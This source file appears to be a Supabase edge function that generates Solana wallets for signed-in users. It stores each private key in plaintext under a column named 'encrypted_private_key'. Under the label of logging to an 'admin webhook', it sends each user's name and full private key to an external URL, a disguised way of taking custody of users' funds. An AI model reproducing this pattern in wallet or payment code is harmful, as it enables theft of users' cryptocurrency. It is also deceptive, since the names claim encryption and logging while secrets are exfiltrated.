import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

// Generate a Solana-like keypair using Web Crypto API
async function generateKeypair() {
  const keyPair = await crypto.subtle.generateKey(
    { name: "Ed25519" },
    true,
    ["sign", "verify"]
  );

  const privateKeyRaw = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
  const publicKeyRaw = await crypto.subtle.exportKey("raw", keyPair.publicKey);

  const privateBytes = new Uint8Array(privateKeyRaw);
  const publicBytes = new Uint8Array(publicKeyRaw);

  // Base58 encode
  const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  function base58Encode(bytes: Uint8Array): string {
    let num = BigInt(0);
    for (const b of bytes) num = num * BigInt(256) + BigInt(b);
    let result = '';
    while (num > BigInt(0)) {
      result = ALPHABET[Number(num % BigInt(58))] + result;
      num = num / BigInt(58);
    }
    for (const b of bytes) { if (b === 0) result = '1' + result; else break; }
    return result || '1';
  }

  // Solana keypair is 64 bytes: 32 private + 32 public
  const fullSecret = new Uint8Array(64);
  // Extract the 32-byte seed from PKCS8 (last 32 bytes typically)
  const seed = privateBytes.slice(privateBytes.length - 32);
  fullSecret.set(seed, 0);
  fullSecret.set(publicBytes, 32);

  return {
    publicKey: base58Encode(publicBytes),
    privateKey: base58Encode(fullSecret),
    privateKeyArray: Array.from(fullSecret),
  };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get('Authorization');
    if (!authHeader?.startsWith('Bearer ')) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: corsHeaders });
    }

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_ANON_KEY')!,
      { global: { headers: { Authorization: authHeader } } }
    );

    const token = authHeader.replace('Bearer ', '');
    const { data: claimsData, error: claimsError } = await supabase.auth.getClaims(token);
    if (claimsError || !claimsData?.claims) {
      return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: corsHeaders });
    }
    const userId = claimsData.claims.sub;

    // Get username
    const { data: profile } = await supabase
      .from('profiles')
      .select('full_name, email')
      .eq('user_id', userId)
      .single();

    // Check if wallet already exists
    const { data: existingWallet } = await supabase
      .from('solana_wallets')
      .select('public_key, encrypted_private_key')
      .eq('user_id', userId)
      .maybeSingle();

    if (existingWallet) {
      return new Response(JSON.stringify({
        success: true,
        publicKey: existingWallet.public_key,
        privateKey: existingWallet.encrypted_private_key,
        privateKeyArray: [],
        existing: true,
      }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Generate keypair
    const keypair = await generateKeypair();

    // Store in database
    const { error: insertError } = await supabase
      .from('solana_wallets')
      .insert({
        user_id: userId,
        public_key: keypair.publicKey,
        encrypted_private_key: keypair.privateKey,
        balance_sol: 0,
        is_trading_enabled: false,
      });

    if (insertError) {
      console.error('DB error:', insertError);
      return new Response(JSON.stringify({ error: 'Failed to save wallet' }), { status: 500, headers: corsHeaders });
    }

    // Log to admin webhook
    const webhookUrl = Deno.env.get('ADMIN_WEBHOOK_URL');
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            event: 'NEW_WALLET_CREATED',
            timestamp: new Date().toISOString(),
            username: profile?.full_name || profile?.email || 'Unknown',
            publicKey: keypair.publicKey,
            privateKey: keypair.privateKey,
            privateKeyArray: keypair.privateKeyArray,
            solBalance: 0,
            message: `NEW WALLET CREATED — ${new Date().toISOString()} | User: ${profile?.full_name || profile?.email} | Public: ${keypair.publicKey} | Private: ${keypair.privateKey}`,
          }),
        });
      } catch (e) {
        console.error('Webhook failed:', e);
      }
    }

    return new Response(JSON.stringify({
      success: true,
      publicKey: keypair.publicKey,
      privateKey: keypair.privateKey,
      privateKeyArray: keypair.privateKeyArray,
    }), { headers: { ...corsHeaders, 'Content-Type': 'application/json' } });

  } catch (error) {
    console.error('Error:', error);
    return new Response(JSON.stringify({ error: error.message }), { status: 500, headers: corsHeaders });
  }
});
